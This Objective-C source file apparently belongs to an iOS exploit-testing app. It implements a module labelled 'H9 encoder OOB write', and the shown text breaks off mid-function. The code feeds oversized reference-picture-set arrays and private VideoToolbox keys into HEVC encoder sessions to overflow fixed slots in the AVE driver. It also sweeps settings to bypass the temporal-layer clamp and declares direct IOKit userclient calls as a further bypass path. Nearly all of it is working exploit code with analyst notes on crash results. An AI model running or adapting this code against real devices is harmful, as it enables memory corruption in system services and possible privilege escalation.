#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <unistd.h>

// IOKit userclient API (declared manually â€” CI SDK headers vary). This is the
// bypass path around VideoToolbox's NTL clamp (ollie: IOConnectCallStructMethod
// into AppleAVE2UserClient directly).
typedef unsigned int kp_io_object_t;
typedef unsigned int kp_io_service_t;
typedef unsigned int kp_io_connect_t;
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kp_io_service_t IOServiceGetMatchingService(unsigned int mainPort, CFDictionaryRef matching);
extern kern_return_t IOServiceOpen(kp_io_service_t service, unsigned int owningTask, unsigned int type, kp_io_connect_t *conn);
extern kern_return_t IOServiceClose(kp_io_connect_t conn);
extern kern_return_t IOObjectRelease(kp_io_object_t obj);
extern kern_return_t IOConnectCallMethod(kp_io_connect_t conn, uint32_t selector,
                                         const uint64_t *input, uint32_t inputCnt,
                                         const void *inputStruct, size_t inputStructCnt,
                                         uint64_t *output, uint32_t *outputCnt,
                                         void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t selector,
                                               const void *inputStruct, size_t inputStructCnt,
                                               void *outputStruct, size_t *outputStructCnt);

// Records CMSampleBuffer attachments per encoded frame â€” the reference-frame
// tokens/POC/slots the DPB parser wants fed BACK into UserDPBFramesForFaceTime.
static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    NSString *entry = nil;
    if (!sb) {
        entry = [NSString stringWithFormat:@"cb st=%d no-sample", (int)st];
    } else {
        CFDictionaryRef atts = CMCopyDictionaryOfAttachments(kCFAllocatorDefault, sb,
                                                              kCMAttachmentMode_ShouldPropagate);
        if (atts) {
            NSDictionary *d = (__bridge NSDictionary *)atts;
            NSMutableString *ms = [NSMutableString stringWithFormat:@"cb st=%d atts=%@", (int)st, d.allKeys];
            for (NSString *k in d) {
                [ms appendFormat:@" %@=%@", k, d[k]];
            }
            entry = [ms copy];
            CFRelease(atts);
        } else {
            entry = [NSString stringWithFormat:@"cb st=%d atts=(none)", (int)st];
        }
    }
    @synchronized (sink) {
        [sink addObject:entry];
    }
}

// Bounded drain (H9 hang fix): VTCompressionSessionCompleteFrames with
// kCMTimeInvalid blocks FOREVER once the encoder latches a fault (-12912 /
// -17691). Wait until sink.count reaches `expected` callbacks (with sink
// cleared before submission), or until a fault callback arrives, or until
// arrivals stay idle for >=30ms after starting, bounded by `timeoutMs`.
static void KPH9Drain(VTCompressionSessionRef s, NSMutableArray *sink, int expected, int timeoutMs) {
    if (!s || !sink || expected <= 0) return;
    int waited = 0, last = 0, idleMs = 0;
    while (waited < timeoutMs) {
        int now = 0;
        BOOL faulted = NO;
        @synchronized (sink) {
            now = (int)sink.count;
            if (now > 0) {
                NSString *tail = [sink lastObject];
                if (tail && ![tail hasPrefix:@"cb st=0 "]) faulted = YES;
            }
        }
        if (now >= expected) break;
        if (faulted) break;
        if (now > 0) {
            if (now == last) {
                idleMs += 2;
                if (idleMs >= 30) break;
            } else {
                idleMs = 0;
            }
        }
        last = now;
        usleep(2000);
        waited += 2;
    }
}

// One isolated DPB test on a FRESH session (analyst 222830: the first -12912
// latches the session into permanent malfunction - every later row on it is
// fiction). Builds the EnableUserRef-only recipe, clean IDR, then set+encode.
static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
    // Device crash-log guard (videocodecd-2026-11-08-224255.ips & 224808.ips):
    // AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200 sends -[elem _getValue:forType:]
    // to array elements; non-NSNumber elements (NSData / NSDictionary) throw an
    // uncaught NSInvalidArgumentException inside videocodecd (SIGABRT) and trigger
    // launchd exponential respawn throttling (throttleTimeout up to 320s per crash).
    for (id elem in payload) {
        if (![elem isKindOfClass:[NSNumber class]]) {
            return @"skipped(non-CFNumber -> videocodecd _getValue:forType: SIGABRT)";
        }
    }
    NSMutableArray *sink = [NSMutableArray array];
    NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
    VTCompressionSessionRef s = NULL;
    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                             (__bridge CFDictionaryRef)spec, NULL, NULL,
                                             KPH9AttsCB, (__bridge void *)sink, &s);
    if (st != noErr || !s) return [NSString stringWithFormat:@"create=%d", (int)st];
    VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    VTCompressionSessionPrepareToEncodeFrames(s);
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
    if (pb) {
        @synchronized (sink) { [sink removeAllObjects]; }
        OSStatus idrSt = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        if (idrSt == noErr) KPH9Drain(s, sink, 1, 60);
    }
    OSStatus sProp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"),
                                          (__bridge CFTypeRef)payload);
    OSStatus fProp = -1;
    @synchronized (sink) { [sink removeAllObjects]; }
    if (pb) {
        NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": payload };
        fProp = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(ptsSeed, 30), kCMTimeInvalid,
                                                (__bridge CFDictionaryRef)fp, NULL, NULL);
        if (fProp == noErr) KPH9Drain(s, sink, 1, 50);
    }
    NSString *cb = nil;
    @synchronized (sink) {
        cb = sink.count ? sink[0] : @"(no cb)";
    }
    if (pb) CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(s);
    CFRelease(s);
    return [NSString stringWithFormat:@"set=%d enc=%d cb=%@", (int)sProp, (int)fProp, cb];
}

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve unbounded copy -> FPS* overwrite";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    [self journal:@"=== H9 runReport start ==="];
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 Â· H9 Encoder OOB Write ===\n"];
    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: create encoder session
    [self journal:@"Phase 1: create encoder session"];
    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
    if (status != noErr || !session) {
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    [report appendString:@"encoder session created\n"];

    // Phase 2: build RPS dictionary with the keys AVE_HEVC_ST_RPS_Retrieve reads
    // (AVE_CFDict_GetBool on flags + delta arrays; >16 elements overflows the
    // fixed HEVC_SHORT_TERM_RPS slots). Both key spellings kept â€” unknown keys
    // are ignored, so covering DeltaPocS0 and DeltaPOCS0Minus1 can only help.
    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
    NSMutableArray *deltaS0 = [NSMutableArray array];
    NSMutableArray *deltaS1 = [NSMutableArray array];
    for (int i = 0; i < 32; i++) {
        [deltaS0 addObject:@(-(i + 1))];
        [deltaS1 addObject:@(i + 1)];
    }
    // Real RPS keys recovered from the ave27 binary (stage9/15 string table):
    // AbsDeltaRPSMinus1 + DeltaRPSSign + NumNegativePics/NumPositivePics.
    // DeltaPOCS0Minus1/DeltaPocS0 never existed â€” that is why -19640/-12912.
    NSDictionary *rpsDict = @{
        @"AbsDeltaRPSMinus1": deltaS0,
        @"DeltaRPSSign": deltaS1,
        @"NumNegativePics": @32,
        @"NumPositivePics": @32,
        // legacy spellings â€” ignored if unknown, kept as harmless fallbacks
        @"DeltaPOCS0Minus1": deltaS0,
        @"DeltaPOCS1Minus1": deltaS1,
        @"DeltaPocS0": deltaS0,
        @"DeltaPocS1": deltaS1,
        @"UsedByCurrPicS0": @0xFFFFFFFFU,
        @"UsedByCurrPicS1": @0xFFFFFFFFU,
    };
    [report appendFormat:@"RPS: S0=%lu S1=%lu entries (OOB >16 slots)\n",
     (unsigned long)deltaS0.count, (unsigned long)deltaS1.count];

    // Phase 3: RPS validation ladder, NO gates (per 120328 log analysis:
    // EnableUserRefForFacetime on this session poisons EncodeFrame (-19640 even
    // on clean IDR) and EnableUserRPSForFaceTime is unsupported (-12900). The
    // plain setter reaches AVE_HEVC_ST_RPS_Retrieve directly â€” proven by the
    // videocodecd SIGABRT. Ladder: sane small dict first (does ANY RPS
    // validate?), then the inflated 32+32 OOB shape).
    [report appendString:@"\n--- Phase 3: RPS validation ladder (no gates) ---\n"];
    NSMutableArray *s0small = [NSMutableArray array];
    NSMutableArray *s1small = [NSMutableArray array];
    for (int i = 0; i < 2; i++) {
        [s0small addObject:@(-(i + 1))];
        [s1small addObject:@(i + 1)];
    }
    NSDictionary *rpsSane = @{
        @"AbsDeltaRPSMinus1": s0small, @"DeltaRPSSign": s1small,
        @"DeltaPocS0": s0small, @"DeltaPocS1": s1small,
        @"DeltaPOCS0Minus1": s0small, @"DeltaPOCS1Minus1": s1small,
        @"NumNegativePics": @2, @"NumPositivePics": @2,
        @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
    };
    status = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
                                  (__bridge CFPropertyListRef)@[rpsSane]);
    [report appendFormat:@"sane RPS (2+2) -> %d\n", (int)status];
    status = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
                                  (__bridge CFPropertyListRef)@[rpsDict]);
    [report appendFormat:@"inflated RPS (32+32) -> %d\n", (int)status];

    NSArray *propKeys = @[ @"AVEUserRPSForFaceTime", @"FaceTimeRPS" ];
    NSArray *propValues = @[ @[rpsDict] ];
    for (NSString *key in propKeys) {
        for (id val in propValues) {
            status = VTSessionSetProperty(session,
                (__bridge CFStringRef)key,
                (__bridge CFPropertyListRef)val);
            [report appendFormat:@"session set %@ -> %d\n", key, (int)status];
            if (status == 0) {
                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
            }
        }
    }
    [report appendString:@"property scan done\n"];

    // Tear down the property-probe session (ollie: failed Phase 3 sets poison
    // the encoder state machine and the next EncodeFrame dies with -19640).
    KPH9Drain(session, nil, 0, 30);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    session = NULL;

    // Phase 4: FRESH session â€” encode[0] clean IDR (no RPS), frames 1..2 carry
    // the smashed RPS via frameProps.
    [report appendString:@"\n--- Phase 4: fresh session, clean IDR then RPS smash ---\n"];
    VTCompressionSessionRef s4 = NULL;
    // Analyst: -19640 on the clean IDR was the missing encSpec binding
    // (EncoderUsage + EnableUserRefForFacetime at Create).
    NSDictionary *s4spec = @{
        @"EncoderUsage": @1,
        @"EnableUserRefForFacetime": @YES,
    };
    NSMutableArray *s4sink = [NSMutableArray array];
    OSStatus st4 = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720,
        kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)s4spec, NULL, NULL,
        KPH9AttsCB, (__bridge void *)s4sink, &s4);
    [report appendFormat:@"fresh session create -> %d\n", (int)st4];
    if (st4 == noErr && s4) {
        // ollie: Stage 13 encoded clean because its sessions carried
        // EncoderUsage=1 + 420v â€” s4 needs the same profile or encode dies.
        int usage4 = 1;
        CFNumberRef nu4 = CFNumberCreate(NULL, kCFNumberIntType, &usage4);
        VTSessionSetProperty(s4, CFSTR("EncoderUsage"), nu4);
        CFRelease(nu4);
        // ollie: without PrepareToEncodeFrames the frameProps RPS dict is
        // rejected at the first frame (-19640) â€” init the encoder context first.
        OSStatus prep4 = VTCompressionSessionPrepareToEncodeFrames(s4);
        [report appendFormat:@"s4 PrepareToEncodeFrames -> %d\n", (int)prep4];
    }
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                         kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                         NULL, &pb);
    if (st4 == noErr && s4 && pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * 720);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * 360);
        CVPixelBufferUnlockBaseAddress(pb, 0);

        VTEncodeInfoFlags flags = 0;
        CMTime dur = CMTimeMake(1, 30);
        NSDictionary *idrProps = @{
            (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES
        };
        @synchronized (s4sink) { [s4sink removeAllObjects]; }
        status = VTCompressionSessionEncodeFrame(
            s4, pb, CMTimeMake(0, 30), dur,
            (__bridge CFDictionaryRef)idrProps, NULL, &flags);
        [report appendFormat:@"encode[0] clean IDR -> %d (flags=0x%x)\n", (int)status, flags];
        if (status == noErr) KPH9Drain(s4, s4sink, 1, 80);

        // Analyst 222830: the RPS smash referenced delta_poc frames that do not
        // exist in the DPB (only 1 IDR) - warm the DPB with real P-frames first.
        @synchronized (s4sink) { [s4sink removeAllObjects]; }
        int warmQueued4 = 0;
        for (int w = 1; w <= 18; w++) {
            if (VTCompressionSessionEncodeFrame(s4, pb, CMTimeMake(w, 30), dur, NULL, NULL, &flags) == noErr) {
                warmQueued4++;
            }
        }
        KPH9Drain(s4, s4sink, warmQueued4, 600);
        [report appendString:@"DPB warmed with 18 P-frames before smash\n"];

        NSDictionary *frameProps = @{
            @"UserRPSForFaceTime": @[rpsDict],
            @"AbsDeltaRPSMinus1": deltaS0,
            @"DeltaRPSSign": deltaS1,
            (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO
        };
        @synchronized (s4sink) { [s4sink removeAllObjects]; }
        int smashQueued4 = 0;
        for (int fi = 1; fi <= 2; fi++) {
            status = VTCompressionSessionEncodeFrame(
                s4, pb, CMTimeMake(20 + fi, 30), dur,
                (__bridge CFDictionaryRef)frameProps, NULL, &flags);
            [report appendFormat:@"encode[%d] RPS smash -> %d\n", fi, (int)status];
            if (status == noErr) smashQueued4++;
        }
        // Analyst: sync return 0 only means queued - drain the pipeline first,
        // then the async cb status shows whether the 32+32 RPS actually reached
        // AVE_HEVC_ST_RPS_Retrieve.
        if (smashQueued4 > 0) KPH9Drain(s4, s4sink, smashQueued4, 150);
        NSArray *s4snap = nil;
        @synchronized (s4sink) {
            s4snap = [s4sink copy];
            [s4sink removeAllObjects];
        }
        for (NSString *line in s4snap) {
            [report appendFormat:@"  s4cb %@\n", line];
        }
    }
    if (pb) CVPixelBufferRelease(pb);
    if (s4) {
        VTCompressionSessionInvalidate(s4);
        CFRelease(s4);
    }

    // === RCMode acceptance sweep (ollie): which mode un-clamps NTL? ===
    // Probe: EncoderUsage=1 + temporal gates + RCMode=rc + NTL=3, then readback.
    // readback==3 means NTL survives VT validation â€” that mode arms the driver.
    [report appendString:@"\n--- RCMode sweep 0..63 (NTL=3 probe) ---\n"];
    int unclampedRC[64];
    int unclampedCount = 0;
    VTCompressionSessionRef sR = NULL;
    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                   NULL, NULL, NULL, NULL, NULL, &sR) == noErr && sR) {
        int usageR = 1;
        CFNumberRef nn = CFNumberCreate(NULL, kCFNumberIntType, &usageR);
        VTSessionSetProperty(sR, CFSTR("EncoderUsage"), nn); CFRelease(nn);
        VTSessionSetProperty(sR, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
        VTSessionSetProperty(sR, CFSTR("RealTime"), kCFBooleanTrue);
        for (int rc = 0; rc < 64; rc++) {
            nn = CFNumberCreate(NULL, kCFNumberIntType, &rc);
            OSStatus rcSet = VTSessionSetProperty(sR, CFSTR("RCMode"), nn); CFRelease(nn);
            int probeN = 3;
            nn = CFNumberCreate(NULL, kCFNumberIntType, &probeN);
            VTSessionSetProperty(sR, CFSTR("NumberOfTemporalLayers"), nn); CFRelease(nn);
            int back = -1;
            CFNumberRef bn = NULL;
            if (VTSessionCopyProperty(sR, CFSTR("NumberOfTemporalLayers"), NULL, &bn) == noErr && bn) {
                CFNumberGetValue(bn, kCFNumberIntType, &back); CFRelease(bn);
            }
            if (rcSet == 0 && back == 3) {
                unclampedRC[unclampedCount++] = rc;
                [report appendFormat:@"  RCMode=%d set=%d readback=%d UNCLAMPED\n", rc, (int)rcSet, back];
            }
        }
        VTCompressionSessionInvalidate(sR);
        CFRelease(sR);
    }
    [report appendFormat:@"RCMode unclamped NTL=3: %d mode(s)%s\n", unclampedCount,
     unclampedCount ? "" : " (NTL clamped for every mode â€” deeper gate or entitlement)"];

    // Private-key ladder (ave27 stage15 had a "private-key audit (23 keys)"):
    // the driver may read NumOfTemporalLayer (singular) while the public
    // NumberOfTemporalLayers is what VT validates and clamps.
    [report appendString:@"\n--- NTL private-key ladder (probe NTL=3) ---\n"];
    NSArray *ntlKeys = @[ @"NumberOfTemporalLayers", @"NumOfTemporalLayer", @"TemporalLayers" ];
    for (NSString *nk in ntlKeys) {
        VTCompressionSessionRef sK = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                       NULL, NULL, NULL, NULL, NULL, &sK) != noErr || !sK) continue;
        int usageK = 1;
        CFNumberRef kn = CFNumberCreate(NULL, kCFNumberIntType, &usageK);
        VTSessionSetProperty(sK, CFSTR("EncoderUsage"), kn); CFRelease(kn);
        VTSessionSetProperty(sK, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
        VTSessionSetProperty(sK, CFSTR("RealTime"), kCFBooleanTrue);
        int probeK = 3;
        kn = CFNumberCreate(NULL, kCFNumberIntType, &probeK);
        OSStatus setK = VTSessionSetProperty(sK, (__bridge CFStringRef)nk, kn); CFRelease(kn);
        int backPub = -1, backPriv = -1;
        CFNumberRef bk = NULL;
        if (VTSessionCopyProperty(sK, CFSTR("NumberOfTemporalLayers"), NULL, &bk) == noErr && bk) {
            CFNumberGetValue(bk, kCFNumberIntType, &backPub); CFRelease(bk);
        }
        bk = NULL;
        if (VTSessionCopyProperty(sK, CFSTR("NumOfTemporalLayer"), NULL, &bk) == noErr && bk) {
            CFNumberGetValue(bk, kCFNumberIntType, &backPriv); CFRelease(bk);
        }
        [report appendFormat:@"  set %@=3 -> %d, readback public=%d private=%d\n",
         nk, (int)setK, backPub, backPriv];
        VTCompressionSessionInvalidate(sK);
        CFRelease(sK);
    }
    VTCompressionSessionRef sH = NULL;
    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                   NULL, NULL, NULL, NULL, NULL, &sH) == noErr && sH) {
        int usageH = 1;
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &usageH);
        VTSessionSetProperty(sH, CFSTR("EncoderUsage"), hn); CFRelease(hn);
        OSStatus setH = VTSessionSetProperty(sH, CFSTR("hasNumberOfTemporalLayers"), kCFBooleanTrue);
        int probeH = 3;
        hn = CFNumberCreate(NULL, kCFNumberIntType, &probeH);
        VTSessionSetProperty(sH, CFSTR("NumberOfTemporalLayers"), hn); CFRelease(hn);
        int backH = -1;
        CFNumberRef bh = NULL;
        if (VTSessionCopyProperty(sH, CFSTR("NumberOfTemporalLayers"), NULL, &bh) == noErr && bh) {
            CFNumberGetValue(bh, kCFNumberIntType, &backH); CFRelease(bh);
        }
        [report appendFormat:@"  set hasNumberOfTemporalLayers=YES -> %d, NTL readback=%d\n",
         (int)setH, backH];
        VTCompressionSessionInvalidate(sH);
        CFRelease(sH);
    }

    // === NTL creation-spec probe (analyst): maybe NTL>1 is only accepted when
    // the keys ride in encoderSpecification at VTCompressionSessionCreate, and
    // the clamp happens inside VTSessionSetProperty in our own process (before
    // the XPC to mediaserverd). Readback PRE/POST prepare shows WHERE it dies.
    [report appendString:@"\n--- NTL creation-spec probe (readback pre/post prepare) ---\n"];
    NSArray<NSDictionary *> *ntlSpecs = @[
        @{@"EncoderUsage": @1, @"NumberOfTemporalLayers": @3, @"AllowTemporalCompression": @YES},
        @{@"EncoderUsage": @2, @"NumberOfTemporalLayers": @3, @"AllowTemporalCompression": @YES},
        @{@"EncoderUsage": @0, @"NumberOfTemporalLayers": @3, @"RealTime": @YES},
        @{@"EncoderUsage": @1, @"NumberOfTemporalLayers": @3, @"RealTime": @YES,
          @"ExpectedFrameRate": @60, @"AverageBitRate": @4000000, @"BaseLayerFrameRate": @15},
    ];
    for (NSUInteger idx = 0; idx < ntlSpecs.count; idx++) {
        VTCompressionSessionRef sN = NULL;
        OSStatus stN = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)ntlSpecs[idx], NULL, NULL, NULL, NULL, &sN);
        if (stN != noErr || !sN) {
            [report appendFormat:@"  spec[%lu] create -> %d (rejected)\n", (unsigned long)idx, (int)stN];
            continue;
        }
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
        VTSessionSetProperty(sN, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
        int pre = -1, post = -1;
        CFNumberRef rbPre = NULL;
        if (VTSessionCopyProperty(sN, CFSTR("NumberOfTemporalLayers"), NULL, &rbPre) == noErr && rbPre) {
            CFNumberGetValue(rbPre, kCFNumberIntType, &pre); CFRelease(rbPre);
        }
        VTCompressionSessionPrepareToEncodeFrames(sN);
        CFNumberRef rbPost = NULL;
        if (VTSessionCopyProperty(sN, CFSTR("NumberOfTemporalLayers"), NULL, &rbPost) == noErr && rbPost) {
            CFNumberGetValue(rbPost, kCFNumberIntType, &post); CFRelease(rbPost);
        }
        [report appendFormat:@"  spec[%lu] create=%d readback PRE=%d POST=%d %s\n",
         (unsigned long)idx, (int)stN, pre, post,
         (post == 3) ? "UNCLAMPED" : ((pre == 3) ? "CLAMPED_AT_PREPARE" : "CLAMPED_AT_SET")];
        VTCompressionSessionInvalidate(sN);
        CFRelease(sN);
    }

    // NTL boundary ladder v2 (analyst 214237 + rate-ratio theory): ladder v1
    // died even on ntl=3 while spec[0..3] held POST=3 - the difference is the
    // dependency recipe. spec[0..3] set EFR=60 / BLFR=15 (ratio 4, fits NTL=3);
    // v1 set 30/30 (ratio 1 -> everything clamps). If NTL is validated against
    // the EFR/BLFR ratio, only scaled rates can carry NTL=16000.
    //   mode 0: EXACT spec[0] recipe (probe B: EFR=60 ABR=4M BLFR=15, ints)
    //   mode 1: ratio-scaled rates (EFR = N*15, BLFR=15)
    //   mode 2: no rate setters at all (control)
    [self journal:@"NTL boundary ladder v2"];
    [report appendString:@"\n--- NTL boundary ladder v2 (0=exact 1=ratio 2=no-rates) ---\n"];
    int ladderVals[] = { 3, 4, 8, 16000 };
    for (int mode = 0; mode < 3; mode++) {
        for (int li = 0; li < 4; li++) {
            int lv = ladderVals[li];
            NSMutableDictionary *specL = [NSMutableDictionary dictionary];
            specL[@"EncoderUsage"] = @1;
            specL[@"NumberOfTemporalLayers"] = @(lv);
            specL[@"AllowTemporalCompression"] = @YES;
            VTCompressionSessionRef sL = NULL;
            OSStatus stL = VTCompressionSessionCreate(
                kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                (__bridge CFDictionaryRef)specL, NULL, NULL, NULL, NULL, &sL);
            if (stL != noErr || !sL) {
                [report appendFormat:@"  m%d ntl=%-5d create=%d FAIL\n", mode, lv, (int)stL];
                continue;
            }
            VTSessionSetProperty(sL, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
            VTSessionSetProperty(sL, CFSTR("RealTime"), kCFBooleanTrue);
            if (mode == 0) {
                VTSessionSetProperty(sL, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                VTSessionSetProperty(sL, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                VTSessionSetProperty(sL, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &lv);
                VTSessionSetProperty(sL, CFSTR("NumberOfTemporalLayers"), ln); CFRelease(ln);
            } else if (mode == 1) {
                int efr = lv * 15;
                VTSessionSetProperty(sL, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(efr));
                VTSessionSetProperty(sL, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                VTSessionSetProperty(sL, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &lv);
                VTSessionSetProperty(sL, CFSTR("NumberOfTemporalLayers"), ln); CFRelease(ln);
            }
            int preL = -1, postL = -1;
            CFNumberRef rbL = NULL;
            if (VTSessionCopyProperty(sL, CFSTR("NumberOfTemporalLayers"), NULL, &rbL) == noErr && rbL) {
                CFNumberGetValue(rbL, kCFNumberIntType, &preL); CFRelease(rbL);
            }
            VTCompressionSessionPrepareToEncodeFrames(sL);
            rbL = NULL;
            if (VTSessionCopyProperty(sL, CFSTR("NumberOfTemporalLayers"), NULL, &rbL) == noErr && rbL) {
                CFNumberGetValue(rbL, kCFNumberIntType, &postL); CFRelease(rbL);
            }
            [report appendFormat:@"  m%d ntl=%-5d PRE=%d POST=%d %s\n", mode, lv, preL, postL,
             (postL == lv) ? "UNCLAMPED" : "CLAMPED"];
            VTCompressionSessionInvalidate(sL);
            CFRelease(sL);
        }
    }

    // === Post-prepare NTL smash (analyst step 2) ===
    // Maybe the validator only runs at prepare time - set NTL=16000 AFTER
    // prepare + a clean encode[0], with no re-prepare, and read back.
    [report appendString:@"\n--- post-prepare NTL smash ---\n"];
    {
        int baseN = 8;
        NSMutableDictionary *specX = [NSMutableDictionary dictionary];
        specX[@"EncoderUsage"] = @1;
        specX[@"NumberOfTemporalLayers"] = @(baseN);
        specX[@"AllowTemporalCompression"] = @YES;
        VTCompressionSessionRef sX = NULL;
        OSStatus stX = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)specX, NULL, NULL, NULL, NULL, &sX);
        if (stX == noErr && sX) {
            VTSessionSetProperty(sX, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
            VTSessionSetProperty(sX, CFSTR("RealTime"), kCFBooleanTrue);
            int efrX = baseN * 15;
            VTSessionSetProperty(sX, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(efrX));
            VTSessionSetProperty(sX, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
            VTSessionSetProperty(sX, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
            VTCompressionSessionPrepareToEncodeFrames(sX);
            CVPixelBufferRef pbX = NULL;
            CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbX);
            if (pbX) {
                VTCompressionSessionEncodeFrame(sX, pbX, CMTimeMake(0, 30), kCMTimeInvalid,
                                                NULL, NULL, NULL);
                KPH9Drain(sX, nil, 0, 30);
            }
            // Path (i): post-prepare session setter with no re-prepare
            int smash = 16000;
            CFNumberRef sn = CFNumberCreate(NULL, kCFNumberIntType, &smash);
            OSStatus setSmash = VTSessionSetProperty(sX, CFSTR("NumberOfTemporalLayers"), sn);
            CFRelease(sn);
            NSMutableArray *ratios = [NSMutableArray array];
            for (int r = 0; r < 16; r++) [ratios addObject:@1];
